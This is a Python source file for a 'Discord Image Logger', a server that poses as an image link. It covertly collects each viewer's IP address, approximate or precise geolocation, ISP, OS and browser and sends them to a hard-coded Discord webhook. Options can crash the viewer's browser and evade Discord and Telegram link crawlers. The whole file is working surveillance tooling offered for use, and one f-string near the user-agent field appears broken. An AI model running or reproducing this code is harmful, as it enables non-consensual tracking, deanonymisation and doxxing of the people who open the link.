# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                })
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown", 
                "country": "Unknown", "regionName": "Unknown", "city": "Unknown", 
                "lat": 0, "lon": 0, "timezone": "Unknown/Unknown", "mobile": False}
    
    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return
        elif config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting", False):
        if config["antiBot"] == 4:
            if not info.get("proxy", False):
                return
        elif config["antiBot"] == 3:
            return
        elif config["antiBot"] == 2:
            if not info.get("proxy", False):
                ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    if useragent:
        try:
            os, browser = httpagentparser.simple_detect(useragent)
        except:
            os, browser = "Unknown", "Unknown"
    else:
        os, browser = "Unknown", "Unknown"
    
    coords_text = f'{info.get("lat", 0)}, {info.get("lon", 0)}' if not coords else coords.replace(',', ', ')
    maps_link = f'https://www.google.com/maps/search/google+map++{coords}' if coords else ''
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get("isp", "Unknown")}`
> **ASN:** `{info.get("as", "Unknown")}`
> **Country:** `{info.get("country", "Unknown")}`
> **Region:** `{info.get("regionName", "Unknown")}`
> **City:** `{info.get("city", "Unknown")}`
> **Coords:** `{coords_text}` ({'Approximate' if not coords else f'Precise, [Google Maps]({maps_link})'})
> **Timezone:** `{info.get("timezone", "Unknown/Unknown").split("/")[-1].replace("_", " ") if "/" in info.get("timezone", "Unknown/Unknown") else "Unknown"}`
> **Mobile:** `{info.get("mobile", False)}`
> **VPN:** `{info.get("proxy", False)}`
> **Bot:** `{info.get("hosting", False) if info.get("hosting", False) and not info.get("proxy", False) else "Possibly" if info.get("hosting", False) else "False"}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass
    
    def handleRequest(self):
        try:
            # Get client IP
            client_ip = self.headers.get('x-forwarded-for', self.client_address[0])
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if client_ip and client_ip.startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"Access Denied")
                return
            
            user_agent = self.headers.get('user-agent', '')
            
            if botCheck(client_ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_header('Location', url)
                    self.end_headers()
                
                makeReport(client_ip, endpoint=self.path.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                        result = makeReport(client_ip, user_agent, location, s.split("?")[0], url=url)
                    except:
                        result = makeReport(client_ip, user_agent, endpoint=s.split("?")[0], url=url)
                else:
                    result = makeReport(client_ip, user_agent, endpoint=s.split("?")[0], url=url)
                
                message = config["message"]["message"]

                if config["message"]["richMessage"] and result and isinstance(result, dict):
                    message = message.replace("{ip}", client_ip or "Unknown")
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", 0)))
                    message = message.replace("{long}", str(result.get("lon", 0)))
                    
                    timezone = result.get("timezone", "Unknown/Unknown")
                    if "/" in timezone:
                        timezone = f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})"
                    
                    message = message.replace("{timezone}", timezone)
                    message = message.replace("{mobile}", str(result.get("mobile", False)))
                    message = message.replace("{vpn}", str(result.get("proxy", False)))
                    
                    bot_status = result.get("hosting", False)
                    if bot_status and not result.get("proxy", False):
                        bot_str = str(bot_status)
                    elif bot_status:
                        bot_str = "Possibly"
                    else:
                        bot_str = "False"
                    message = message.replace("{bot}", bot_str)
                    
                    if user_agent:
                        try:
                            detected = httpagentparser.simple_detect(user_agent)
                            message = message.replace("{browser}", detected[1] if len(detected) > 1 else "Unknown")
                            message = message.replace("{os}", detected[0] if len(detected) > 0 else "Unknown")
                        except:
                            message = message.replace("{browser}", "Unknown")
                            message = message.replace("{os}", "Unknown")
                    else:
                        message = message.replace("{browser}", "Unknown")
                        message = message.replace("{os}", "Unknown")

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

def run_server(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, ImageLoggerAPI)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
